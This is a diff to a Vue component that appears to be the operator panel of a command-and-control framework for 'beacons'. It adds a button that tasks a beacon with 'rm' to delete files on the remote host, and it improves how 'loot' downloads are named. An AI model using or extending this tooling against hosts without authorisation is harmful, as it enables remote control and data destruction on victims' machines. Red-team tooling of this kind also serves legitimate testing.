@@ -78,8 +78,9 @@
           {{ row.modTime || '-' }}
         </template>
         <template #actions="{ row }">
-          <div class="row-actions" v-if="!row.isDir">
-            <Button variant="ghost" size="sm" @click.stop="downloadFile(row)">下载</Button>
+          <div class="row-actions">
+            <Button variant="outline" size="sm" v-if="!row.isDir" @click.stop="downloadFile(row)">下载</Button>
+            <Button variant="danger" size="sm" @click.stop="deleteFile(row)">删除</Button>
           </div>
         </template>
         <template #empty>
@@ -323,24 +324,26 @@ const handleFileUpload = async (event: Event) => {
 
 const downloadLoot = async (filename: string) => {
   try {
-    const response = await api.get(`/loot/${filename}`, { responseType: 'blob' })
+    const response = await api.get(`/loot/${encodeURIComponent(filename)}`, { responseType: 'blob' })
     const url = window.URL.createObjectURL(new Blob([response.data]))
     const link = document.createElement('a')
     link.href = url
     
+    // Get filename from Content-Disposition header or use the original filename
     const contentDisposition = response.headers['content-disposition']
     let downloadName = filename
     
-    // Strip the task ID prefix if present (e.g., "UUID_filename.ext" -> "filename.ext")
-    const underscoreIndex = downloadName.indexOf('_');
-    if (underscoreIndex !== -1 && underscoreIndex < 40) { // Assume UUID prefix is roughly 36 chars
-        downloadName = downloadName.substring(underscoreIndex + 1);
-    }
-
     if (contentDisposition) {
-      const filenameMatch = contentDisposition.match(/filename="?([^"]+)"?/)
-      if (filenameMatch && filenameMatch.length === 2) {
-        downloadName = filenameMatch[1]
+      // Handle RFC 5987 encoded filename (filename*=UTF-8''...)
+      const rfc5987Match = contentDisposition.match(/filename\*=UTF-8''([^;\s]+)/)
+      if (rfc5987Match && rfc5987Match[1]) {
+        downloadName = decodeURIComponent(rfc5987Match[1])
+      } else {
+        // Fallback to standard filename
+        const filenameMatch = contentDisposition.match(/filename="?([^"]+)"?/)
+        if (filenameMatch && filenameMatch[1]) {
+          downloadName = filenameMatch[1]
+        }
       }
     }
     
@@ -371,6 +374,26 @@ const downloadFile = async (row: any) => {
     toast.success('下载任务已发送')
   } catch (error) {
     toast.error('请求下载失败')
+  }
+}
+
+const deleteFile = async (row: any) => {
+  if (!confirm(`确定要删除 ${row.name} 吗？此操作不可逆。`)) return
+
+  toast.info(`正在请求删除 ${row.name}...`)
+  try {
+    const fullPath = currentPath.value.endsWith('/') 
+      ? currentPath.value + row.name 
+      : currentPath.value + '/' + row.name
+    
+    await api.post(`/beacons/${props.beaconId}/tasks`, {
+      command: 'rm',
+      arguments: fullPath
+    })
+    toast.success('删除任务已发送')
+  } catch (error) {
+    console.error(error)
+    toast.error('请求删除失败')
   }
 }
 
@@ -435,6 +458,9 @@ const handleWebSocketMessage = (message: any) => {
            }
         } else if (task.Command === 'download' && task.Status === 'completed') {
            toast.success('文件已成功下发到目标')
+        } else if (task.Command === 'rm' && task.Status === 'completed') {
+           toast.success('文件删除成功')
+           listFiles() // Refresh the list
         }
       }
       
@@ -521,7 +547,9 @@ onUnmounted(() => {
 
 .row-actions {
   display: flex;
-  gap: var(--spacing-xs);
+  align-items: center;
+  justify-content: flex-end;
+  gap: var(--spacing-sm);
 }
 
 .empty-state {
